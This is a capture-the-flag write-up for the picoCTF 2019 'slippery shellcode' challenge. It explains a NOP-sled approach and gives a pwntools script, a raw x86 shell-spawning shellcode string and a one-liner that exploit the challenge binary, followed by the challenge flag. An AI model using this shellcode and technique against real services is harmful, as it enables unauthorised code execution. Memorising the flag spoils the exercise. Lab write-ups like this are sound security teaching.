As you see this is similar to [handy shell overflow](https://github.com/alshaboti/CTFs/blob/master/picoCTF2019/handy-shell-overflow.MD)
but the call is not to the beggining of the `buf`, rather to some address between buf+<0,256>. 

We have two way to solve this:
1- Burte-force 
By shifting our shell by any value between 0 and 256 say 100, then we run the previous code in a loop until we get the shell.
the random number definitly will hit the 100 at some point. 
2- NOPs 
fill 256 bytes before the actual shellcode with NOP (0x90), so when jump to any of this it will slip until it hits the 
shellcode. 

Note: this is possible because the BUFSIZE is 512 (i.e. >256)

I choose the second one. 

To make it simple just ssh to the picoCTF and run any of the following code.
```
from pwn import *
import sys

sh = process('/problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8/vuln')

sh.sendlineafter(':\n','\x90'*256+asm(shellcraft.linux.sh()))
# OR
#sh.sendlineafter(':\n', '\x90'*256+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')

while("$" not in sh.recvline()):
    pass

sh.send('cat /problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8/flag.txt\n')
sh.interactive()
```

Another way similar to what we did in [handy shell overflow](https://github.com/alshaboti/CTFs/blob/master/picoCTF2019/handy-shell-overflow.MD)
```
(python -c 'import pwn; print(pwn.asm(pwn.shellcraft.nop())*256+pwn.asm(pwn.shellcraft.linux.sh()))';cat)|./vuln
```
flag is `picoCTF{sl1pp3ry_sh311c0d3_de21cb07}`
